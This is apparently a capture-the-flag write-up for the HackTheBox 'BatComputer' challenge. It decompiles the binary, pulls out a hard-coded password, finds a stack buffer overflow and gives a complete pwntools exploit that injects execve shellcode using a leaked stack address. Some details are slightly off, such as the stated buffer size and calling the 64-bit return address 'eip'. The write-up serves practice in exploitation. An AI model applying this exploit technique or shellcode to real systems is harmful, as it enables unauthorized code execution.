---
title: BatComputer HackTheBox 
author: pwndumb
date: 2021-04-22 11:10:00 +0800
categories: [pwn,Linux]
tags: [pwn,linux]
---
# BatComputer

I have to exploit the `BatComputer` binary. 

## Analysis of the Binary

Let's run `checksec` in the binary:

```bash
root@09263602631a:/pwd# checksec batcomputer

[*] '/pwd/batcomputer'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
root@09263602631a:/pwd#

```

### Dinamic Analysis 

Let me run the binary and see whats happen:

```bash
┌──(root💀71d272d1ad85)-[/pwd]
└─# ./batcomputer
Welcome to your BatComputer, Batman. What would you like to do?
1. Track Joker
2. Chase Joker
> 2
Ok. Let's do this. Enter the password:
```

We need a password. Let me analyse that in [rizin](https://rizin.re)

## Rizin Analysis

In rizin I can use the plugin `rz-ghidra` to decompile the program: 

```c
[0x000010b0]> s main
[0x000011ec]> pdg

// WARNING: Could not reconcile some variable overlaps

undefined8 main(void)
{
    int32_t iVar1;
    char *buf;
    undefined auStack84 [76];

    fcn.000011a9();
    while( true ) {
        while( true ) {
            sym.imp.memset((int64_t)&buf + 4, 0, 0x10);
            sym.imp.printf(
                          "Welcome to your BatComputer, Batman. What would you like to do?\n1. Track Joker\n2. Chase Joker\n> "
                          );
            sym.imp.__isoc99_scanf(0x2069, &buf);
            if ((int32_t)buf != 1) break;
            sym.imp.printf("It was very hard, but Alfred managed to locate him: %p\n", auStack84);
        }
        if ((int32_t)buf != 2) break;
        sym.imp.printf("Ok. Let\'s do this. Enter the password: ");
        sym.imp.__isoc99_scanf("%15s", (int64_t)&buf + 4);
        iVar1 = sym.imp.strcmp((int64_t)&buf + 4, "b4tp@$$w0rd!");
        if (iVar1 != 0) {
            sym.imp.puts("The password is wrong.\nI can\'t give you access to the BatMobile!");
    // WARNING: Subroutine does not return
            sym.imp.exit(0);
        }
        sym.imp.printf("Access Granted. \nEnter the navigation commands: ");
        sym.imp.read(0, auStack84, 0x89);
        sym.imp.puts("Roger that!");
    }
    sym.imp.puts("Too bad, now who\'s gonna save Gotham? Alfred?");
    return 0;
}

```
Now I know the password that I need.

## Buffer overflow

It's clear that has a `buffer overflow` in last `read`. The variable `auStack84` has 0x76 bytes and the read allow to insert 0x89 bytes. 


## Leak Address 

The program leak address of my buffer will be in the `stack`.
```bash
┌──(root💀452e899102af)-[/pwd/2-bat-computer]
└─# ./batcomputer
Welcome to your BatComputer, Batman. What would you like to do?
1. Track Joker
2. Chase Joker
> 1
It was very hard, but Alfred managed to locate him: 0x7ffd2eeecec4
Welcome to your BatComputer, Batman. What would you like to do?
1. Track Joker
2. Chase Joker
>

```

## Find the padding

Using gdb I can find the correct offset to trigger my buffer overflow: `84 bytes`. 


## The main ideia

 Run the program and choose the option `1` to read where my buffer will be. Next I choose the option `2` and send the password `b4tp@$$w0rd!`. Finish I send a buffer with my shellcode. The buffer will change the flow of program and execute my payload.

> padding + eip + shellcode

To trigger my buffer overflow I send option `3` that doesnt exist, so the program will return and my buffer will overwrite the return address. 

### Pay Attention

> When recieve the `SIGV`, debug the exploit and see if some instructions not overwriting the shellcode. 
>  pwntool is a great tool, but you must understand what is going one behind the scenes. 


## Exploit


```python
#!/usr/bin/python3

from pwn import *

def main():
    context.log_level='DEBUG'
    context.update(arch='amd64', os='linux')
    log.info("lets solve")
    p=process('./batcomputer')

    # leak address of my buffer
    p.recvuntil('>')
    p.sendline('1')

    leak_address = p.recvline().split()[-1]
    leak_address = int(leak_address,16)
    log.success(f'leak_address: {hex(leak_address)}')

    # send evil payload
    # payload + eip + shellcode

    padding = b'A' * 84

    shellcode  = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91"
    shellcode += b"\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
    shellcode += b"\x54\x5f\x99\x52\x57\x54\x5e\xb0"
    shellcode += b"\x3b\x0f\x05"

    buffer = flat (
            padding,
            p64(leak_address + 84+8),
            shellcode
            )

    p.recvuntil('>')
    p.send('2')
    p.recv()
    p.sendline('b4tp@$$w0rd!')
    p.recvline()
    p.send(buffer)

    # trigger buffer overflow
    p.recvline()
    p.sendline('3')

    p.interactive()

if __name__ == '__main__':
    main()
```

